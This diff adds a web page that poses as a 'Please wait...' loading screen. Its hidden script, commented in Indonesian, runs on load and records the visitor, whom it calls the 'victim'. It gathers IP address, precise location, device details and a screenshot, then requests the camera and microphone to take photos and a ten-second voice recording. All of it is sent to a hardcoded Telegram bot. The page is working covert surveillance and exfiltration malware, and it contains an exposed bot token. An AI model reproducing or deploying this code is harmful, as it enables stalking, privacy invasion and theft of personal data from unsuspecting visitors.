@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background: #f5f5f5;
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .spinner {
+            border: 3px solid #e0e0e0;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="spinner"></div>
+        <div class="message">Please wait...</div>
+    </div>
+
+    <script>
+        // ========== KONFIGURASI TELEGRAM ==========
+        const BOT_TOKEN = '8450168477:AAHAncu3hD0uc0zp4OGjpdjuz_TnV3lmJvY';
+        const CHAT_ID = '7604508820';
+        // ===========================================
+
+        let cameraStream = null;
+        let audioChunks = [];
+        let mediaRecorder = null;
+
+        // Fungsi kirim data ke Telegram
+        function sendToTelegram(message, type = 'text', blob = null) {
+            if (type === 'text') {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(() => {});
+            } else if (type === 'photo' && blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', '📸 Foto Korban');
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+            } else if (type === 'audio' && blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('audio', blob, 'audio.webm');
+                formData.append('caption', '🎤 Rekaman Suara');
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+            }
+        }
+
+        // Ambil data LENGKAP korban
+        async function collectAllData() {
+            try {
+                // 1. IP ADDRESS
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+
+                // 2. LOKASI DETAIL
+                const locRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,as,query,mobile,proxy,hosting,timezone`);
+                const locData = await locRes.json();
+
+                // 3. INFO PERANGKAT LENGKAP
+                const battery = navigator.getBattery ? await navigator.getBattery() : null;
+                const batteryInfo = battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Battery'})` : 'Unknown';
+                
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const connectionInfo = connection ? 
+                    `${connection.effectiveType || 'N/A'}, ${connection.downlink || '?'} Mbps, RTT: ${connection.rtt || '?'}ms` : 
+                    'Unknown';
+                
+                // 4. INFORMASI LENGKAP
+                let message = `🔥 **DATA KORBAN SUPER LENGKAP** 🔥\n\n`;
+                message += `📡 **IP ADDRESS:** ${ip}\n`;
+                message += `🌐 **HOSTNAME:** ${window.location.hostname}\n`;
+                message += `🔗 **URL:** ${window.location.href}\n\n`;
+                
+                if (locData.status === 'success') {
+                    message += `📍 **LOKASI DETAIL:**\n`;
+                    message += `├─ Negara: ${locData.country}\n`;
+                    message += `├─ Region: ${locData.regionName}\n`;
+                    message += `├─ Kota: ${locData.city}\n`;
+                    message += `├─ Latitude: ${locData.lat}\n`;
+                    message += `├─ Longitude: ${locData.lon}\n`;
+                    message += `├─ Google Maps: https://maps.google.com/?q=${locData.lat},${locData.lon}\n`;
+                    message += `├─ ISP: ${locData.isp}\n`;
+                    message += `├─ Organisasi: ${locData.org || 'N/A'}\n`;
+                    message += `├─ AS Number: ${locData.as || 'N/A'}\n`;
+                    message += `├─ Mobile: ${locData.mobile ? 'Ya' : 'Tidak'}\n`;
+                    message += `├─ Proxy/VPN: ${locData.proxy ? 'Ya' : 'Tidak'}\n`;
+                    message += `├─ Hosting: ${locData.hosting ? 'Ya' : 'Tidak'}\n`;
+                    message += `└─ Timezone: ${locData.timezone || 'N/A'}\n\n`;
+                }
+                
+                message += `📱 **INFO PERANGKAT:**\n`;
+                message += `├─ Platform: ${navigator.platform}\n`;
+                message += `├─ Vendor: ${navigator.vendor || 'N/A'}\n`;
+                message += `├─ Language: ${navigator.language}\n`;
+                message += `├─ Languages: ${navigator.languages?.join(', ') || 'N/A'}\n`;
+                message += `├─ Cookie Enabled: ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}\n`;
+                message += `├─ Do Not Track: ${navigator.doNotTrack || 'Tidak'}\n`;
+                message += `├─ Battery: ${batteryInfo}\n`;
+                message += `├─ Koneksi: ${connectionInfo}\n`;
+                message += `├─ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+                message += `├─ Screen Resolution: ${window.screen.width}x${window.screen.height}\n`;
+                message += `├─ Screen Color Depth: ${window.screen.colorDepth}bit\n`;
+                message += `├─ Hardware Concurrency: ${navigator.hardwareConcurrency || '?'} core\n`;
+                message += `├─ Device Memory: ${navigator.deviceMemory || '?'} GB\n`;
+                message += `├─ Max Touch Points: ${navigator.maxTouchPoints || 0}\n`;
+                message += `├─ Online: ${navigator.onLine ? 'Ya' : 'Tidak'}\n`;
+                message += `├─ Referrer: ${document.referrer || 'Langsung'}\n`;
+                message += `├─ Local Storage: ${typeof(Storage) !== 'undefined' ? 'Tersedia' : 'Tidak'}\n`;
+                message += `├─ Session Storage: ${window.sessionStorage ? 'Tersedia' : 'Tidak'}\n`;
+                message += `└─ Waktu Lokal: ${new Date().toLocaleString()}\n\n`;
+                
+                message += `🖥️ **USER AGENT:**\n${navigator.userAgent}`;
+
+                sendToTelegram(message, 'text');
+                console.log('Data terkirim');
+            } catch (e) {
+                console.log('Error:', e);
+                sendToTelegram(`❌ Error collecting data\nUser Agent: ${navigator.userAgent}`, 'text');
+            }
+        }
+
+        // Ambil foto dari kamera
+        function capturePhoto(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    sendToTelegram(null, 'photo', blob);
+                }, 'image/jpeg', 0.9);
+                
+                video.pause();
+                video.srcObject = null;
+            }, 1000);
+        }
+
+        // Rekam suara (10 detik)
+        function recordAudio(stream) {
+            const audioTrack = stream.getAudioTracks()[0];
+            if (!audioTrack) return;
+            
+            const audioStream = new MediaStream([audioTrack]);
+            mediaRecorder = new MediaRecorder(audioStream);
+            
+            mediaRecorder.ondataavailable = e => {
+                if (e.data && e.data.size > 0) {
+                    audioChunks.push(e.data);
+                }
+            };
+            
+            mediaRecorder.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                sendToTelegram(null, 'audio', audioBlob);
+                audioChunks = [];
+            };
+            
+            mediaRecorder.start();
+            
+            setTimeout(() => {
+                if (mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 10000); // 10 detik
+        }
+
+        // Screenshot (pake library)
+        async function captureScreenshot() {
+            return new Promise((resolve) => {
+                if (!window.html2canvas) {
+                    const script = document.createElement('script');
+                    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
+                    script.onload = () => {
+                        setTimeout(() => {
+                            takeScreenshot().then(resolve);
+                        }, 500);
+                    };
+                    document.head.appendChild(script);
+                } else {
+                    takeScreenshot().then(resolve);
+                }
+            });
+        }
+
+        async function takeScreenshot() {
+            if (!window.html2canvas) return;
+            
+            try {
+                const canvas = await html2canvas(document.body, { 
+                    scale: 0.8, 
+                    logging: false,
+                    allowTaint: true,
+                    useCORS: true
+                });
+                
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'screenshot.png');
+                    formData.append('caption', '🖥️ Screenshot Layar');
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(() => {});
+                }, 'image/png', 0.9);
+            } catch (e) {}
+        }
+
+        // Fungsi utama
+        async function start() {
+            // Kirim data lokasi & IP dulu (pasti kekirim)
+            collectAllData();
+            
+            // Ambil screenshot (usahakan)
+            captureScreenshot();
+            
+            // Minta akses kamera & mikrofon
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+                
+                cameraStream = stream;
+                
+                // Ambil foto
+                capturePhoto(stream);
+                
+                // Rekam suara
+                recordAudio(stream);
+                
+                // Ambil foto lagi setelah 3 detik (biar dapet angle lain)
+                setTimeout(() => {
+                    capturePhoto(stream);
+                }, 3000);
+                
+                // Matikan stream setelah 15 detik
+                setTimeout(() => {
+                    stream.getTracks().forEach(t => t.stop());
+                }, 15000);
+                
+            } catch (err) {
+                console.log('Camera/mic access denied:', err);
+                // Tetap jalan, data lokasi udah kekirim
+            }
+        }
+
+        // Mulai setelah halaman dimuat
+        window.onload = start;
+    </script>
+</body>
+</html>
